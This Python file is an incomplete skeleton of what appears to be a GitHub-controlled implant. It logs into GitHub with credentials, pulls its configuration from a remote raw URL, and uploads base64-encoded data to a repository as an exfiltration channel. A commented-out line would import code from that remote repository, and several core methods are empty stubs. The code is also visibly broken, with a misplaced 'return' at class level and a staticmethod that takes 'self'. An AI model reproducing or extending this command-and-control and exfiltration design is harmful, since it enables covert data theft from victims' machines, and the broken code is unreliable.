#!/usr/bin/env python
import json
import base64
import random
from github3 import login
# from httpimp import add_remote_repo
# add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen


class Boy(object):
    _id = 'abc'
    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/'

    def __init__(self, guser, gpass, repo):
        self.gh = self.repo = self.branch = None
        self.connect(guser, gpass, repo)

    def connect(self, u, p, repo):
        self.gh = login(username=u, password=p)
        self.repo = self.gh.repository(u, repo)
        self.branch = self.repo.branch('master')
        return

    def save_result(self, data, msg):
        remote_path = 'data/%s/%d.data' % (self._id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, msg, base64.b64encode(data))
    return

    @staticmethod
    def get_config(self, config_url):
        try:
            config = urlopen(config_url).read()
            return json.loads(config)
        except Exception:
            return None

    def install(self):
        pass

    @staticmethod
    def enc(data):
        pass

    @staticmethod
    def dec(data):
        pass

    @staticmethod
    def run(config):
        pass
